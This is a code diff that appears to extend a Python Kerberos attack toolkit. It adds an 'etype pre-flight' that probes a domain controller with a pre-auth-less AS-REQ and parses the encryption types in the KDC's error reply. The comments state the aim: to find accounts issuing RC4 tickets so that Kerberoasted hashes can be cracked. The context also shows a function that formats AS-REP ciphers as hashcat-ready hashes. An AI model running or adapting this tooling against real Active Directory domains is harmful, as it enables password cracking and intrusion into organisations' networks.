@@ -213,6 +213,124 @@ def parse_response(data: bytes) -> dict:
     return {"type": "unknown"}
 
 
+# --- etype pre-flight (PA-ETYPE-INFO2) ---------------------------------------
+# Kerberoast turns into a crackable hash only when the SPN account issues an
+# RC4 (etype 23) TGS — an AES-only account gives you an AES256 hash that is
+# orders of magnitude harder to crack. `msDS-SupportedEncryptionTypes` on the
+# account tells the KDC which etypes it may use; PA-ETYPE-INFO2 in the KDC's
+# reply reveals what the KDC will actually pick.
+#
+# By RFC 4120 §5.2.7.5, PA-ETYPE-INFO2 arrives inside the e-data of a
+# KRB-ERROR when a pre-auth-less AS-REQ hits an account that requires pre-auth
+# (code 25 = KDC_ERR_PREAUTH_REQUIRED). It is a padata-type 19 entry whose
+# data is a METHOD-DATA carrying PA-ETYPE-INFO2 (SEQUENCE OF
+# ETYPE-INFO2-ENTRY, each { etype [0] Int32, salt [1] KerberosString OPT, ... }).
+#
+# Reading it before requesting a TGS avoids the "roasted an AES-only account,
+# got a useless hash" outcome — the pre-flight is the safest kerberoast prep
+# step and no OSS tool ships it cleanly.
+
+_KRB_ETYPE_NAMES = {
+    1: "des-cbc-crc", 3: "des-cbc-md5",
+    17: "aes128-cts-hmac-sha1-96",
+    18: "aes256-cts-hmac-sha1-96",
+    23: "rc4-hmac", 24: "rc4-hmac-exp",
+}
+_PADATA_ETYPE_INFO2 = 19
+
+
+def _extract_padata(krberror_body: bytes) -> list[tuple[int, bytes]]:
+    """From a KRB-ERROR body, pull the (padata-type, padata-value) entries in
+    the e-data field. e-data is [12] OCTET STRING wrapping a METHOD-DATA
+    (SEQUENCE OF PA-DATA); each PA-DATA is a SEQUENCE with fields
+    padata-type [1] and padata-value [2]."""
+    edata = _ctx_inner(krberror_body, 12)
+    if not edata:
+        return []
+    try:
+        _t, method_data, _ = _read_tlv(edata, 0)
+    except (ValueError, IndexError):
+        return []
+    out = []
+    # METHOD-DATA is SEQUENCE OF PA-DATA. Each PA-DATA child is a SEQUENCE, so
+    # we want the inner value bytes to look up context tags [1] and [2] on.
+    for _tag, pa_body in _children(method_data):
+        try:
+            typ_b = _ctx_inner(pa_body, 1)
+            val_b = _ctx_inner(pa_body, 2)
+            if typ_b and val_b is not None:
+                out.append((int.from_bytes(typ_b, "big"), val_b))
+        except (ValueError, IndexError):
+            continue
+    return out
+
+
+def parse_etype_info2(padata_value: bytes) -> list[dict]:
+    """Decode a PA-ETYPE-INFO2 padata value into [{etype, salt}, ...]."""
+    entries = []
+    try:
+        _t, seq, _ = _read_tlv(padata_value, 0)
+    except (ValueError, IndexError):
+        return entries
+    # SEQUENCE OF ETYPE-INFO2-ENTRY — each child is itself a SEQUENCE whose
+    # inner value carries the context tags.
+    for _tag, entry_body in _children(seq):
+        et_b = _ctx_inner(entry_body, 0)
+        salt_b = _ctx_inner(entry_body, 1)
+        if not et_b:
+            continue
+        entries.append({
+            "etype": int.from_bytes(et_b, "big"),
+            "salt": salt_b.decode("utf-8", "replace") if salt_b else "",
+        })
+    return entries
+
+
+def etype_preflight(dc_ip: str, realm: str, user: str,
+                    timeout: float = 5.0) -> dict:
+    """Query the KDC for the etypes it will use for `user@realm`.
+
+    Sends a pre-auth-less AS-REQ (build_as_req offers RC4+AES) and reads the
+    KRB-ERROR reply. Returns:
+      {"reachable": bool, "code": int, "etypes": [{etype, name, salt}, ...],
+       "has_rc4": bool, "aes_only": bool}
+
+    Only relies on the KDC's own reply. Nothing is decrypted, no credential is
+    tried, no lockout counter is touched (pre-auth-less AS-REQ does not).
+    """
+    out: dict = {"reachable": False, "code": None, "etypes": [],
+                 "has_rc4": False, "aes_only": False}
+    payload = build_as_req(user, realm.upper())
+    reply = _send_recv(dc_ip, payload, timeout)
+    if not reply:
+        return out
+    out["reachable"] = True
+    try:
+        tag, body, _ = _read_tlv(reply, 0)
+        _t, seq, _ = _read_tlv(body, 0)
+    except (ValueError, IndexError):
+        return out
+    if tag != 0x7E:                          # not a KRB-ERROR — nothing to mine
+        return out
+    err = _ctx_inner(seq, 6)
+    out["code"] = int.from_bytes(err, "big") if err else None
+    # PA-ETYPE-INFO2 rides on KDC_ERR_PREAUTH_REQUIRED (25); other errors mean
+    # the account is unknown / disabled / has a different problem and no etype
+    # info is disclosed.
+    entries: list[dict] = []
+    for typ, val in _extract_padata(seq):
+        if typ == _PADATA_ETYPE_INFO2:
+            entries = parse_etype_info2(val)
+            break
+    for e in entries:
+        e["name"] = _KRB_ETYPE_NAMES.get(e["etype"], f"etype-{e['etype']}")
+    out["etypes"] = entries
+    et_set = {e["etype"] for e in entries}
+    out["has_rc4"] = 23 in et_set
+    out["aes_only"] = bool(et_set) and et_set.issubset({17, 18})
+    return out
+
+
 def asrep_hash(user: str, realm: str, etype: int, cipher: bytes) -> str:
     """Format an AS-REP cipher as a crackable hash. etype 23 (RC4) -> hashcat 18200
     `$krb5asrep$23$user@REALM:<checksum>$<edata>`; other etypes -> a generic form."""
